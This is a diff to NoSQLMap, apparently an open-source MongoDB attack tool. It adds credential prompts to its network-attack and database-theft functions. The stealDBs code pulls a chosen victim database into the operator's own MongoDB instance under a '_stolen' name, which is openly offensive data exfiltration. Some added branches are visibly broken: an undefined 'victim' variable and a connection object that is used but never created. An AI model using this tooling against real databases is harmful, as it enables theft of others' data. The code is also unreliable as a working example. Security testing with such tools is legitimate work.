@@ -13,6 +13,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+
 import sys
 import string
 import random
@@ -32,7 +33,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.1-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.2DEV-nosqlmap@gmail.com"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -204,19 +205,34 @@ def netAttacks(target):
 	#This is a global for future use with other modules; may change
 	global dbList
 	
-	#Check for default config
-	try:
-		conn = pymongo.MongoClient(target,27017)
-		print "MongoDB port open on " + target + ":27017!"
-		mgtOpen = True
+	srvNeedCreds = raw_input("Does the database server need credentials? ")
 	
-	except:
-		print "MongoDB port closed."
+	if srvNeedCreds == "n" or srvNeedCreds == "N":
+		
+		try:
+			conn = pymongo.MongoClient(target,27017)
+			print "MongoDB port open on " + target + ":27017!"
+			mgtOpen = True
+	
+		except:
+			print "MongoDB port closed."
 		
 		
+	
+	
+	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
+		srvUser = raw_input("Enter server username: ")
+		srvPass = raw_input("Enter server password: ")
+		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
+
+		try:
+			conn = pymongo.MongoClient(uri)
+		except:
+			print "something happened."
+			mainMenu()
+	
+	
 	mgtUrl = "http://" + target + ":28017"
-	
-	
 	try:		
 		#Future rev:  Add web management interface parsing
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
@@ -686,8 +702,21 @@ def stealDBs(myDB):
 		
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
-		myDBConn = pymongo.MongoClient(myDB,27017)
-		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
+		dbNeedCreds = raw_input("Does this database require credentials? ")
+		
+		if dbNeedCreds == "n" or dbNeedCreds == "N":	
+			myDBConn = pymongo.MongoClient(myDB,27017)
+			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
+		
+		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
+			dbUser = raw_input("Enter database username: ")
+			dbPass = raw_input("Enter database password: ")
+			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
+		
+		else:
+			raw_input("Invalid Selection.  Press enter to continue.")
+			stealDBs(myDB)
+			
 		cloneAnother = raw_input("Database cloned.  Copy another?")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
